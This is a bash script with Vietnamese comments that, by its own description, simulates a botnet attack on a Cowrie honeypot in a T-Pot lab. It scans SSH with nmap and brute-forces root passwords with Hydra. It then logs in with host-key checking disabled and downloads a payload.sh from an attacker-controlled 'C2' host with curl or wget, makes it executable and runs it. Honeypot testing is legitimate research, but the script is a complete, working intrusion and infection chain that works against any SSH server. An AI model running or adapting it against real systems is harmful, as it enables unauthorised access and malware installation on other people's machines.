#!/bin/bash
# ============================================
# Mô phỏng botnet cho Cowrie (T-Pot)
# ============================================

set -euo pipefail

TPOT_IP="${1:-}"
KALI_IP="${2:-}"
TPOT_PORT="${3:-${TPOT_PORT:-22}}"

usage() { echo "Usage: $0 <T-POT_IP> <KALI_IP> [TPOT_PORT]"; exit 1; }
[[ -z "$TPOT_IP" || -z "$KALI_IP" ]] && usage

need() { command -v "$1" >/dev/null 2>&1 || { echo "[!] Thiếu công cụ: $1"; exit 1; }; }
for t in nmap hydra sshpass curl; do need "$t"; done

echo "[*] Kiểm tra C2: http://$KALI_IP:8080/payload.sh ..."
if ! curl -fsS --max-time 5 "http://$KALI_IP:8080/payload.sh" >/dev/null; then
  echo "[!] Không truy cập được payload.sh tại $KALI_IP:8080"
  echo "    - Trên Kali:  cd ~/c2server && python3 -m http.server 8080"
  echo "    - Firewall:   sudo ufw allow 8080/tcp (nếu có ufw)"
  exit 1
fi
echo "[+] C2 OK."

echo "[*] Quét cổng SSH $TPOT_IP:$TPOT_PORT ..."
nmap -sT -p "$TPOT_PORT" "$TPOT_IP" || true

echo "[*] Chuẩn bị danh sách user/pass ..."
echo "root" > users.txt
cat > pass.txt <<'EOF'
root
admin
123456
password
EOF

echo "[*] Brute-force bằng Hydra ..."
hydra -L users.txt -P pass.txt -t 4 -V -f -o hydra.out "ssh://$TPOT_IP" -s "$TPOT_PORT" || true

USER=$(awk '/\[ssh\] host:/ {for(i=1;i<=NF;i++){if($i=="login:"){print $(i+1); exit}}}' hydra.out || true)
PASS=$(awk '/\[ssh\] host:/ {for(i=1;i<=NF;i++){if($i=="password:"){print $(i+1); exit}}}' hydra.out || true)
if [[ -z "${USER:-}" || -z "${PASS:-}" ]]; then
  echo "[!] Hydra không tìm thấy cred → Dùng mặc định: root/admin"
  USER="root"
  PASS="admin"
fi
echo "[+] Dùng cred: $USER / $PASS"

echo "[*] SSH vào Cowrie & chạy chuỗi lệnh tải/chạy payload ..."
sshpass -p "$PASS" ssh -tt \
  -o StrictHostKeyChecking=no \
  -o PreferredAuthentications=password \
  -o ConnectTimeout=8 \
  -o ServerAliveInterval=5 \
  -o ServerAliveCountMax=2 \
  -p "$TPOT_PORT" "$USER@$TPOT_IP" \
  'cd /tmp || cd /var/run || cd /mnt || cd /root || cd / \
   && ( (command -v curl >/dev/null 2>&1 \
         && curl -fsS "http://'$KALI_IP':8080/payload.sh" -o payload.sh) \
        || (command -v wget >/dev/null 2>&1 \
         && wget -qO payload.sh "http://'$KALI_IP':8080/payload.sh") ) \
   && chmod +x payload.sh \
   && ./payload.sh'

echo "[+] Hoàn tất mô phỏng botnet."
